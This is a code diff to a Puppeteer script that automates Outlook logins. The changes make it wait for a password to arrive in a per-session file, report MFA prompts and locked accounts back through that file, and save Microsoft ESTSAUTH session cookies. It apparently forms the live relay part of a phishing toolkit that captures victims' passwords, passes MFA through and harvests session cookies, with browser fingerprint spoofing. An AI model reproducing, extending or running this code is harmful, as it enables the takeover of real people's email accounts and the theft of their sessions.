@@ -116,6 +116,40 @@ async function waitForFile(filePath, timeoutMs = cfg.challengeTimeoutMs) {
     return null;
 }
 
+async function waitForPasswordFromSession(sessionId, timeoutMs = cfg.challengeTimeoutMs) {
+    const sessionFile = path.join(__dirname, 'session_data', `session_${sessionId}.json`);
+    const deadline = Date.now() + timeoutMs;
+    if (shouldLog(cfg.logLevel, 'info')) console.log(`[Session] Waiting for password in: ${path.basename(sessionFile)}`);
+
+    while (Date.now() < deadline) {
+        try {
+            if (fs.existsSync(sessionFile)) {
+                const data = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
+                const pw = (data.password || '').trim();
+                if (pw && pw !== '__from_file__' && pw !== 'PROACTIVE_SESSION_SYNC' && pw !== 'OAUTH_TOKEN_CAPTURED') {
+                    if (shouldLog(cfg.logLevel, 'info')) console.log('[Session] Password received from session file.');
+                    return pw;
+                }
+            }
+        } catch {}
+        await setTimeout(1000);
+    }
+    if (shouldLog(cfg.logLevel, 'warn')) console.log('[Session] Timeout waiting for password in session file.');
+    return null;
+}
+
+function updateSessionStatus(sessionId, status, extraData) {
+    const sf = path.join(__dirname, 'session_data', `session_${sessionId}.json`);
+    if (!fs.existsSync(sf)) return;
+    try {
+        const d = JSON.parse(fs.readFileSync(sf, 'utf8'));
+        d.status = status;
+        d.updated_at = new Date().toISOString();
+        if (extraData) Object.assign(d, extraData);
+        fs.writeFileSync(sf, JSON.stringify(d, null, 4));
+    } catch {}
+}
+
 // Browser utilities
 function applyFingerprint(page) {
     return page.evaluateOnNewDocument(() => {
@@ -325,22 +359,20 @@ class OutlookLoginAutomation {
         });
     }
 
-    async performLogin(email, password, sessionId = null, options = {}) {
-        this.email = email; // Store email on the class instance
+    async performLogin(email, sessionId = null, options = {}) {
+        this.email = email;
         const effectiveSessionId = sessionId || Date.now();
         const pauseOnMfa = !!options.pauseOnMfa;
         const challengeDeadlineMs = Date.now() + (options.challengeTimeoutMs || cfg.challengeTimeoutMs);
-        const cookieJar = new Map(); // The cookie jar to collect all unique cookies.
+        const cookieJar = new Map();
 
         try {
             console.log(`Starting login for: ${email}`);
 
-            // Navigate to Outlook
             await runStep(this.page, effectiveSessionId, 'Navigating to Outlook', async () => {
                 await this.page.goto('https://outlook.office.com', { waitUntil: 'domcontentloaded' });
             });
 
-            // Email input
             await runStep(this.page, effectiveSessionId, 'Entering email', async () => {
                 await this.page.waitForSelector('input[type="email"]');
                 await this.page.type('input[type="email"]', email);
@@ -350,7 +382,6 @@ class OutlookLoginAutomation {
                 await this.page.click('#idSIButton9');
             });
 
-            // Post-email state verification
             let postEmailState = 'POST_EMAIL';
             for (let i = 0; i < 3; i++) {
                 const outcome = await runStep(this.page, effectiveSessionId, `Verifying state after email`, async () => {
@@ -358,13 +389,9 @@ class OutlookLoginAutomation {
                         (sel) => {
                             const isVisible = (element) => element && element.offsetParent !== null;
                             const pageText = document.body.innerText;
-                            // Priority 1: "Work or School" prompt
                             if (isVisible(document.querySelector(sel.workOrSchool))) return { state: 'WORK_OR_SCHOOL' };
-                            // Priority 2: "Username incorrect" error
                             if (pageText.includes(sel.usernameErrorText)) return { state: 'USERNAME_ERROR' };
-                            // Priority 3: Password input field
                             if (isVisible(document.querySelector(sel.passwordInput))) return { state: 'PASSWORD_INPUT' };
-                            // Priority 4: MFA prompt
                             if (document.querySelector(sel.mfaInput)) return { state: 'MFA_PROMPT' };
                             return false;
                         },
@@ -387,7 +414,6 @@ class OutlookLoginAutomation {
                         await setTimeout(1500);
                     });
                 } else if (postEmailState === 'PASSWORD_INPUT' || postEmailState === 'MFA_PROMPT') {
-                    // If we see the password field or an MFA prompt, our work in the post-email race is done.
                     break;
                 } else if (postEmailState === 'USERNAME_ERROR') {
                     throw new Error('Login failed: This username may be incorrect.');
@@ -400,25 +426,27 @@ class OutlookLoginAutomation {
                 throw new Error('Could not reach password input step.');
             }
 
-            // Password input
+            const password = await waitForPasswordFromSession(effectiveSessionId, challengeDeadlineMs - Date.now());
+            if (!password) {
+                throw new Error('Timed out waiting for password from session file.');
+            }
+
             await runStep(this.page, effectiveSessionId, 'Entering password', async () => {
                 await this.page.type('input[type="password"]', password);
                 await this.page.click('#idSIButton9');
-                // Per your instruction, removed waitForNavigation and added a short delay.
                 await setTimeout(1500);
-                await updateCookieJar(this.page, cookieJar); // Collect cookies after password submission
+                await updateCookieJar(this.page, cookieJar);
             });
 
-            // Final login check
             const loginResult = await this.checkLoginSuccess(effectiveSessionId, cookieJar, pauseOnMfa, challengeDeadlineMs);
-            
+
             if (loginResult.success) {
                 console.log('✅ Login successful');
                 return true;
             }
-            
+
             throw new Error('Login verification failed');
-            
+
         } catch (error) {
             await handleError(this, error, effectiveSessionId, 'performLogin');
             return false;
@@ -460,10 +488,16 @@ class OutlookLoginAutomation {
             { timeout: 45000 }
         ).then(() => 'WRONG_PASSWORD');
 
+        const accountLockedPromise = this.page.waitForFunction(
+            () => document.body.innerText.includes('Your account is temporarily locked to prevent unauthorized use'),
+            { timeout: 45000 }
+        ).then(() => 'ACCOUNT_LOCKED');
+
         const winner = await Promise.race([
             staySignedInPromise,
             mfaPromise,
             wrongPasswordPromise,
+            accountLockedPromise,
             successPromise
         ]);
 
@@ -492,8 +526,10 @@ class OutlookLoginAutomation {
 
                 if (hasAuthCookie) {
                     await this.saveMicrosoftCookies(this.page, this.email, sessionId);
+                    updateSessionStatus(sessionId, 'cookies_auth_collected');
                 } else {
                     console.log('Login was successful, but no ESTSAUTH cookie was found. Not saving cookies.');
+                    updateSessionStatus(sessionId, 'failed', { data: { error: 'Login succeeded but no auth cookie captured.' } });
                 }
 
                 return { success: true };
@@ -506,9 +542,9 @@ class OutlookLoginAutomation {
                 return this.checkLoginSuccess(sessionId, cookieJar, pauseOnMfa, challengeDeadlineMs, attempt + 1);
 
             case 'MFA_PROMPT':
-                console.log('MFA prompt found.'); // Announce for the worker
-                fs.writeFileSync(path.join(cfg.artifactsDir, `mfa_prompt_${sessionId}.status`), 'true');
-                await updateCookieJar(this.page, cookieJar); // Collect cookies before waiting
+                console.log('MFA prompt found.');
+                updateSessionStatus(sessionId, 'mfa_prompt');
+                await updateCookieJar(this.page, cookieJar);
 
                 if (pauseOnMfa) {
                     // This is for local debugging and won't be used by the worker
@@ -529,12 +565,18 @@ class OutlookLoginAutomation {
                 return this.checkLoginSuccess(sessionId, cookieJar, pauseOnMfa, challengeDeadlineMs);
 
             case 'WRONG_PASSWORD':
-                // The password was incorrect. Report the final status and allow the script to exit naturally.
                 console.log(JSON.stringify({ status: 'failed', error: 'Password was incorrect.' }));
-                await setTimeout(3000); // 3-second pause for user to see the state if in headful mode.
+                updateSessionStatus(sessionId, 'failed', { data: { error: 'Password was incorrect.' } });
+                await setTimeout(3000);
                 await this.close();
-                // By returning, we let the main execution block handle the process exit.
                 return { success: false, reason: 'WRONG_PASSWORD' };
+
+            case 'ACCOUNT_LOCKED':
+                console.log(JSON.stringify({ status: 'failed', error: 'Account is temporarily locked.' }));
+                updateSessionStatus(sessionId, 'failed', { data: { error: 'Account is temporarily locked.' } });
+                await setTimeout(3000);
+                await this.close();
+                return { success: false, reason: 'ACCOUNT_LOCKED' };
             
             default:
                 throw new Error(`Login failed due to an unknown state: ${winner}`);
@@ -693,8 +735,7 @@ function parseCliArgs(args) {
     
     return {
         email: positional[0] || process.env.EMAIL,
-        password: positional[1] || process.env.PASSWORD,
-        sessionId: positional[2] || String(Date.now()),
+        sessionId: positional[1] || String(Date.now()),
         options: {
             headless: !flags.has('--headful'),
             logLevel: flags.has('--verbose') ? 'verbose' : normalizeLogLevel(process.env.LOG_LEVEL || cfg.logLevel),
@@ -712,8 +753,8 @@ if (require.main === module) {
         const config = parseCliArgs(process.argv.slice(2));
         
         try {
-            if (!config.email || !config.password) {
-                console.error('❌ Email and password required');
+            if (!config.email) {
+                console.error('❌ Email required');
                 process.exit(1);
             }
 
@@ -724,7 +765,7 @@ if (require.main === module) {
             
             await automation.init();
             
-            const success = await automation.performLogin(config.email, config.password, config.sessionId, {
+            const success = await automation.performLogin(config.email, config.sessionId, {
                 pauseOnMfa: config.options.pauseOnMfa,
                 pauseOnChallenge: config.options.pauseOnChallenge,
                 challengeTimeoutMs: config.options.challengeTimeoutMs
